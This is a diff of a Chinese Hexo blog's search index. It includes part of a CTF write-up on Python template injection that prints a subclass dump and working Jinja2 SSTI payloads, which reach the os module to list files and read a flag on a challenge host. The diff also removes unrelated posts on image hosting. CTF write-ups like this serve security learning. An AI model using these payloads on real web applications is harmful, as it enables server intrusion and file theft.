class="hljs-string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="hljs-keyword">not</span> found<br></code></pre></td></tr></table></figure>
+
+<p>可以在其中找到 &lt;type ‘file’&gt;类型 (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
+<p><strong>还可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong>，下表是71，构造payload进行命令执行</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found<br></code></pre></td></tr></table></figure>
+
+<p>接下来构造读取flag payload</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>得到flag：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctf</span>&#123;f22b6844-<span class="hljs-number">5169</span>-<span class="hljs-number">4054</span>-b2a0-d95b9361cb57&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>CTF_Writeup</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Writeup</tag>
+        <tag>攻防世界</tag>
+        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -2165,53 +2116,6 @@
       </tags>
   </entry>
   <entry>
-    <title>关于建站</title>
-    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
-    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
-<p>免费的但不完全免费的聚合图床，路过图床，ImgUrl，SM.MS…</p>
-<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
-<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
-<p>最终还是选用cloudflare R2，因为它对于浏览量不高的个人博主来说确实是纯纯白嫖了</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>建站</tag>
-        <tag>图床</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>图床图片测试</title>
-    <url>/2023/10/29/%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<p><img src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
-<p><img src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
-<p><img src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
-<p><img src="https://img.gaifagafin.top/202311041048278.jpg" alt="CloudFlare R2"></p>
-<p><img src="https://images.gaifagafin.top/202311051019789.jpg" alt="cloudflare R2"></p>
-<p><img src="https://images.gaifagafin.top/202311051020956.png" alt="cloudflare R2"></p>
-<p><img src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
-<p><img src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
-<p><img src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
-<p>视频插入测试，代码为：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> </span><br><span class="hljs-tag"><span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//player.bilibili.com/player.html?aid=534928147&amp;bvid=BV1dM41197wb&amp;cid=1307621987&amp;p=1&quot;</span>  <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> </span><br><span class="hljs-tag"><span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">framespacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">allowfullscreen</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute; width: 100%; </span></span><br><span class="hljs-string"><span class="hljs-tag">height: 100%; left: 0; top: 0;&quot;</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe 
-src="//player.bilibili.com/player.html?aid=534928147&bvid=BV1dM41197wb&cid=1307621987&p=1"  scrolling="no" border="0" 
-frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; 
-height: 100%; left: 0; top: 0;"> </iframe></div>
-
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>picture</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>攻防世界 easytornado</title>
     <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easytornado/</url>
     <content><![CDATA[<img src="https://images.gaifagafin.top/202311051129114.png" style="zoom:67%;" />
@@ -2268,53 +2172,62 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       </tags>
   </entry>
   <entry>
-    <title>攻防世界-Web_python_template_injection</title>
-    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
